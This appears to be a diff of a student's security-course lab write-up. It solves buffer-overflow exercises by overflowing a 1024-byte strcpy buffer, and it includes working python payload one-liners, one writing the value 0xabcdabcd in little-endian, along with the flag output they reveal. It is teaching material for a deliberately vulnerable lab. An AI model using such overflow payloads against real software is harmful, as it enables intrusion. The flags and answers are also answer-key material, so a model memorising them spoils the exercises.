@@ -11,7 +11,7 @@
 To exploit the program and obtain the secret, we target the buffer overflow vulnerability caused by `strcpy`. The `buffer` array has 1024 bytes, and `changeme` is immediately after it in memory. To overwrite `changeme`, our input needs to exceed the `buffer` size and alter `changeme`'s value from 0.
 > 
 > By supplying an input of 1028 characters, we overflow `buffer` and change at least one byte of `changeme`, triggering the conditional to reveal the secret.
->```shell
+>```
 >student@hacklabvm:/home/q1$ ./run_me $(python -c 'print("A"*1025)')
  >_________________________________________
 >/ csf2024s1_{flockwise-overdiversificatio \
@@ -28,9 +28,7 @@ To exploit the program and obtain the secret, we target the buffer overflow vuln
 >```
 
 <div style="page-break-after: always;"></div>
-
 ###### Exercise 2
-
 
 > [!exercise]+ Exercise 2
 > Go to/ home/q2/. Exploit the program to get the secret.
@@ -38,5 +36,21 @@ To exploit the program and obtain the secret, we target the buffer overflow vuln
 > **Answer:**
 > This follows the same logic as exercise 1, but instead of overwriting `changeme` with anything, we need to change it to `0xabcdabcd`. Similar to before, we fill `buffer` with 1024 bytes of garbage, and now we must append `0xabcdabcd` in little endian format, i.e. `\xcd\xab\xcd\xab`.
 > 
-> Since we are limited to `python3`, the command is also a bit different due to the way 
+> Since we are limited to `python3`, the command is also a bit different due to the way strings are encoded.
+>```
+>student@hacklabvm:/home/q2$ ./run_me $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*1024 + b"\xcd\xab\xcd\xab")')
+> _________________________________________
+>/ csf2024s1_{salvifics-cohesionless-nondi \
+>\ lation}                                 /
+> -----------------------------------------
+>  \
+>   \
+>       __     
+>      UooU\.'@@@@@@`.
+>      \__/(@@@@@@@@@@)
+>           (@@@@@@@@)
+>           `YY~~~~YY'
+>            ||    ||
+>```
 
+<div style="page-break-after: always;"></div>
